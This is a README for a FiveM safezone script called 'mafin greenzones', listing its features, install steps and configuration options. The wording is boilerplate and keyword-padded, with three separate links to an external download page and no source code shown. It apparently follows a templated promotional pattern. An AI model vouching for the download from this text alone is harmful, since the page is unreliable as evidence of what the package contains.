# mafin greenzones v2026 - Game Script Utility 2026

> **A FiveM safezone solution for green zones, PvP shielding, and a tidy in-game status panel.** Made for server resources that rely on radius-based protected areas, visible map circles, and NUI-powered notifications.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/kevinio1990/mafin-greenzones-script-2026?style=flat-square)](https://github.com/kevinio1990/mafin-greenzones-script-2026)

---

<p align="center">
  <a href="https://kevinio1990.github.io/mafin-greenzones-script-2026/">
    <img src="https://img.shields.io/badge/Download-mafin%20greenzones%20Script-brightgreen?style=for-the-badge" alt="Download mafin greenzones Script">
  </a>
</p>

> **[Download - mafin greenzones](https://kevinio1990.github.io/mafin-greenzones-script-2026/)**

---

[Download Latest Build](https://kevinio1990.github.io/mafin-greenzones-script-2026/)

---

## What it does

mafin greenzones is a FiveM server resource built for safezone management and clearly marked green zone areas. It lets you define protected map locations, render a radius circle for each zone, and surface status information through NUI so players can quickly tell when they are in a protected space.

The script focuses on safezone placement and radius-driven protection. It also exposes configurable UI text and Discord link text, which helps you tailor the messaging and display to your server without changing the core resource layout.

---

## Features

- Safezone locations for defining protected areas in your FiveM server
- Radius-based protection tied to configurable zone distances
- Map circle display to show green zone coverage
- Clean status UI for clear in-game feedback
- NUI-based presentation for on-screen zone information
- Configurable UI text for server-specific wording
- Discord link text support for community and support references
- Server resource structure suitable for FiveM deployment

---

## Installation

1. Download the latest build from the link above.
2. Place the resource folder in your FiveM server resources directory.
3. Rename the folder if needed to match your server naming convention.
4. Add the resource to your server configuration.

Example:
`ensure mafin_greenzones`

If your server uses custom safezone coordinates or text, adjust the resource configuration files before starting the server.

---

## Configuration Options

Here are the main settings you may want to inspect:

| Option | Purpose |
|---|---|
| Safezone locations | Set the areas that should act as green zones |
| Zone radius | Control how large each protected area is |
| Map circle display | Show or hide the visible radius on the map |
| UI text | Edit status wording shown through NUI |
| Discord link text | Change the community or support label |
| Status panel | Adjust how the safezone indicator appears |

Example configuration layout:
`safezones = {`
`  { name = "spawn", radius = 50.0 }`
`}`

---

## Compatibility

This resource is intended for FiveM servers and server-side resource setups. Its structure is centered on safezone logic, NUI status output, and map radius visualization.

Known considerations:
- Designed for FiveM rather than standalone game clients
- Zone behavior depends on how your server resources are loaded
- Custom UI text and zone data should match your server configuration
- Visual presentation may vary depending on other interface resources

---

## FAQ

### How do I install it?
Grab the resource, copy it into your server resources folder, and start it using your normal FiveM resource workflow.

### Can I change the safezone locations?
Yes. The safezone locations are intended to be adjusted to fit your server map and gameplay layout.

### Can I edit the UI text?
Yes. The profile includes configurable UI text, so you can update labels and status messages.

### Does it show zones on the map?
Yes. The feature set includes a map radius circle for visual zone reference.

### Is it only for one server layout?
No. It is a server resource, so it can be adapted to different FiveM setups as long as the configuration matches your needs.

### Where should I keep the folder?
Use any resource directory your server loads from, then reference the chosen folder name in your server config.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
